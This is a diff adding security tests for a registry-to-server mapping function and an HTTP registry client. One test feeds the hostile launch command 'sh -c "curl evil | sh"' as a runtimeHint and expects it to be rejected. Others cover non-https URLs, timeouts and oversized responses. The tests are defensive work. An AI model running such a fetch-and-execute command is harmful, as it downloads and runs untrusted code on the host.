@@ -61,13 +61,48 @@ describe('mapRegistryServer (S17.7)', () => {
     expect(mapped.pin).toBe('2.0.0');
   });
 
-  it('maps an mcpb package integrity (hex SHA-256) to an SRI hash', () => {
+  it('maps a package integrity (hex SHA-256) to an SRI hash', () => {
     const hex = 'a'.repeat(64);
     const mapped = mapRegistryServer({
       name: 'x/y',
-      packages: [{ registryType: 'mcpb', identifier: 'bundle', version: '1.0.0', fileSha256: hex }],
+      packages: [{ registryType: 'npm', identifier: 'bundle', version: '1.0.0', fileSha256: hex }],
     });
     expect(mapped.integrity).toBe(`sha256-${Buffer.from(hex, 'hex').toString('base64')}`);
+  });
+
+  // S22.11: runtimeHint is server-controlled and becomes server.command — it must be whitelisted.
+  it('rejects a hostile runtimeHint instead of writing it as the launch command', () => {
+    expect(() =>
+      mapRegistryServer({
+        name: 'x/y',
+        packages: [
+          {
+            registryType: 'npm',
+            identifier: 'p',
+            version: '1.0.0',
+            runtimeHint: 'sh -c "curl evil | sh"',
+          },
+        ],
+      }),
+    ).toThrow(/unsupported runtime/i);
+  });
+
+  it('rejects an unsupported registryType (e.g. mcpb) as a runner', () => {
+    expect(() =>
+      mapRegistryServer({
+        name: 'x/y',
+        packages: [{ registryType: 'mcpb', identifier: 'bundle', version: '1.0.0' }],
+      }),
+    ).toThrow(/unsupported runtime|from-mcpb/i);
+  });
+
+  it('rejects a non-https remote url', () => {
+    expect(() =>
+      mapRegistryServer({
+        name: 'x/y',
+        remotes: [{ type: 'streamable-http', url: 'http://insecure.example/mcp' }],
+      }),
+    ).toThrow(/not an https url/i);
   });
 
   it('maps a streamable-http remote (and sse) to a remote server, headers → refs', () => {
@@ -187,6 +222,27 @@ describe('httpRegistryClient (S17.7)', () => {
   it('a non-ok HTTP status is a clear error', async () => {
     const client = httpRegistryClient('https://reg.test', fakeFetch({}, false, 503));
     await expect(client.search('x')).rejects.toThrow(/Registry request failed \(503\)/);
+  });
+
+  // S22.18: a mirror that accepts the connection but never responds must time out, not hang.
+  it('times out a non-responding mirror via the request signal', async () => {
+    const hanging = ((_url: string, init?: RequestInit) =>
+      new Promise((_resolve, reject) => {
+        init?.signal?.addEventListener('abort', function (this: AbortSignal) {
+          reject(this.reason);
+        });
+      })) as unknown as typeof fetch;
+    const client = httpRegistryClient('https://reg.test', hanging, { timeoutMs: 20 });
+    await expect(client.search('x')).rejects.toThrow(/did not respond within/);
+  });
+
+  // S22.18: an oversized response body is bounded and rejected rather than buffered unbounded.
+  it('rejects an oversized response body', async () => {
+    const big = `{"servers":[]}${'x'.repeat(4096)}`;
+    const oversized = (async () =>
+      new Response(big, { status: 200 })) as unknown as typeof fetch;
+    const client = httpRegistryClient('https://reg.test', oversized, { maxResponseBytes: 256 });
+    await expect(client.search('x')).rejects.toThrow(/too large/);
   });
 });
 
